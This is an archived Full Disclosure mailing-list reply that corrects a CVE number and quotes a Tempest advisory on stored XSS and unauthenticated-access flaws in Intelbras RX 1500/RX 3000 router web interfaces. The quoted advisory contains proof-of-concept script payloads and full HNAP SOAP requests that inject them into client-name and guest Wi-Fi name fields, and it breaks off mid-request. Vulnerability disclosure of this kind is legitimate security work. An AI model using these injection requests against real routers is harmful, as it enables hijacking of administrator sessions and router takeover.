---
title: Re: Multiple vulnerabilities in the web management interface of Intelbras routers
url: https://seclists.org/fulldisclosure/2025/Jul/26
source: Full Disclosure
date: 2025-07-31
fetch_date: 2025-10-06T23:56:52.859982
---

# Re: Multiple vulnerabilities in the web management interface of Intelbras routers

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
[![Next](/images/right-icon-16x16.png)](27)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#26)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# Re: Multiple vulnerabilities in the web management interface of Intelbras routers

---

*From*: Palula Brasil <palulabrasil () gmail com>
*Date*: Mon, 21 Jul 2025 12:19:10 -0300

---

```
The following snippet in the text is associated to the wrong CVE number:
2.2 Possibility of injecting JavaScript code into the name of the visiting
network (XSS) - CVE-2025-26064

The correct CVE number for item 2.2 is CVE-2025-26065.

On Sun, Jul 20, 2025 at 3:22 AM Gabriel Augusto Vaz de Lima via
Fulldisclosure <fulldisclosure () seclists org> wrote:
```

> ```
> =====[Tempest Security
> Intelligence]==========================================
>
> Multiple vulnerabilities in the web management interface of Intelbras
> routers
>
> Author: Gabriel Lima <gabriel lima () tempest com br >
>
> =====[Table of
> Contents]======================================================
>
> 1. Overview
>
> 2. Detailed description
>
> 3. Other contexts & solutions
>
> 4. Acknowledgements
>
> 5. Timeline
>
> 6. References
>
> =====[1.
> Overview]============================================================
>
> * Systems affected:
>
> Intelbras web interface RX 1500 - 2.2.9
>
> (verified) (other routers/versions may be affected)
>
> Intelbras web interface RX 3000 - 1.0.11
>
> (verified) (other routers/versions may be affected)
>
> * Release date: 07/14/2025
>
> * Impact: Several vulnerabilities were found providing retrieval of
> administrative session tokens and direct unauthenticated access to
> sensitive features that allow the recovery of current router configuration.
>
> The new generation of connection comes via Wi-Fi 6 technology, delivering
> more speed, more network efficiency and less interference. Router RX 1500
> [1] and RX 3000 [2] are ideal for residential plans with high-speed plans
> and high-performance connections.
>
> =====[2. Detailed
> description]================================================
>
> The web management system for the RX 1500 and 3000 routers is designed to
> help the device’s administrator configure the device in the best way for
> their needs. However, upon carrying out a security research, multiple
> vulnerabilities related to XSS and direct unauthenticated access were
> spotted.
>
> As a result of performing this research, two types of vulnerabilities were
> found: Cross-Site Scripting (XSS) vulnerabilities and Direct
> Unauthenticated Access vulnerabilities.
>
> In regard to the XSS vulnerabilities, as a means to portray impact
> outcomes, an unauthenticated attacker may gain administrative access to the
> system and have full control of the router. On the other hand, an attacker
> with administrator access is able to create persistence to maintain access.
>
> Furthermore, in regard to the direct and unauthenticated access
> vulnerabilities, the application hosts endpoints that provide the
> retrieval  of log files and the router's configuration file, which in turn,
> stores the device's password and its current settings. An important
> highlight regards the fact that any feature can be accessed in an
> unauthenticated manner, as long as an administrator is authenticated and
> active within the system.
>
> The following section dissects the XSS issues.
>
> 2.1 Possibility of injecting JavaScript code into client names (XSS) -
> CVE-2025-26064
>
> An authenticated threat may inject persistent JavaScript from the connected
> clients configuration feature (Home > Connected clients). This problem
> occurs due to the lack of character handling in the “Name” field.
>
> As proof of concept, the following payload was used:
>
> &lt;script&gt;alert(1)&lt;/script&gt;
>
> Payload used in plain text:
>
> <script>alert(1)</script>
>
> The following request pinpoints the insertion of the payload:
>
> [snippet]
>
> POST /HNAP1/ HTTP/1.1
>
> Host: 10.0.0.1
>
> Content-Type: text/xml; charset=utf-8
>
> SOAPAction: "http://purenetworks.com/HNAP1/SetClientInfo";
>
> X-Requested-With: XMLHttpRequest
>
> Content-Length: 596
>
> Cookie: uid=COOKIE-HERE
>
> <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="
> http://www.w3.org/2001/XMLSchema-instance"; xmlns:xsd="
> http://www.w3.org/2001/XMLSchema"; xmlns:soap="
> http://schemas.xmlsoap.org/soap/envelope/";><soap:Body><SetClientInfo
> xmlns="
> http://purenetworks.com/HNAP1/
>
> "><ClientInfoLists><ClientInfo><MacAddress>Client-MacAddresss</MacAddress><NickName>PAYLOAD-IN-HTML-ENCODE</NickName><ReserveIP></ReserveIP><secRouter></secRouter><Type>WIFI_5G</Type><COMMAND>change</COMMAND></ClientInfo></ClientInfoLists><COMMAND></COMMAND></SetClientInfo></soap:Body></soap:Envelope>
>
> [/snippet]
>
> Upon submitting this request, please note the outcome rendered within the
> context of the victim's browser.
>
> 2.2 Possibility of injecting JavaScript code into the name of the visiting
> network (XSS) - CVE-2025-26064
>
> An authenticated threat may inject persistent JavaScript from the Guest
> Network functionality (in the Settings > Wi-Fi > Guest Network menu). This
> problem occurs due to the lack of character handling in the “Wi-Fi network
> name” field (both in 2.4GHz and 5GHz).
>
> As a proof of concept, the following payloads were HTML encoded and
> inserted into each field:
>
> 2.4GHz network: &lt;script&gt;alert(1)&lt;/script&gt;
>
> 5GHz network: &lt;script&gt;alert(2)&lt;/script&gt;
>
> Payloads used in plain text:
>
> 2.4GHz network: <script>alert(1)</script>
>
> 5GHz network: <script>alert(2)</script>
>
> The following portrays an example of the request submitted by the attacker:
>
> [snippet]
>
> POST /HNAP1/ HTTP/1.1
>
> Host: 10.0.0.1
>
> Content-Type: text/xml; charset=utf-8
>
> SOAPAction: "http://purenetworks.com/HNAP1/SetMultipleActions";
>
> X-Requested-With: XMLHttpRequest
>
> Content-Length: 2991
>
> Cookie: uid=COOKIE-HERE
>
> <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="
> http://www.w3.org/2001/XMLSchema-instance"; xmlns:xsd="
> http://www.w3.org/2001/XMLSchema"; xmlns:soap="
> http://schemas.xmlsoap.org/soap/envelope/";><soap:Body><SetMultipleActions
> xmlns="http://purenetworks.com/HNAP1/";><SetWLanRadioSettings xmlns="
> http://purenetworks.com/HNAP1/
> "><RadioID>RADIO_2.4GHz_Guest</RadioID><OpenMainWiFiFirst>false</OpenMainWiFiFirst><Enabled>true</Enabled><Mode>802.11bgn</Mode><SSID>PAYLOAD-IN-HTML-ENCODE-2.4GHz</SSID><SSIDBroadcast>true</SSIDBroadcast><ChannelWidth>20/40</ChannelWidth><Channel>0</Channel><SecondaryChannel>0</SecondaryChannel><QoS>false</QoS><ScheduleName>Always</ScheduleName><TXPower></TXPower><Coexistence>false</Coexistence><WmmCapable></WmmCapable><MuOfdma></MuOfdma><MuMimo></MuMimo><Beamforming></Beamforming><ETxBfEnCond></ETxBfEnCond><TWTSupport></TWTSupport><BssColor></BssColor></SetWLanRadioSettings><SetWLanRadioSecurity
> xmlns="http://purenetworks.com/HNAP1/
> "><RadioID>RADIO_2.4GHz_Guest</RadioID><Enabled>false</Enabled><Type>OPEN</Type><Encryption>NONE</Encryption><KeyRenewal></KeyRenewal><RadiusIP1></RadiusIP1><RadiusPort1></RadiusPort1><RadiusSecret1></RadiusSecret1><RadiusIP2></RadiusIP2><RadiusPort2></RadiusPort2><RadiusSecret2></RadiusSecret2><Key>ROUTER-KEY</Key></SetWLanRadioSecurity><SetWLanRadioSettings
> xmlns="http://purenetworks.com/HNAP1/
> "><RadioID>RADIO_5GHz_Gue...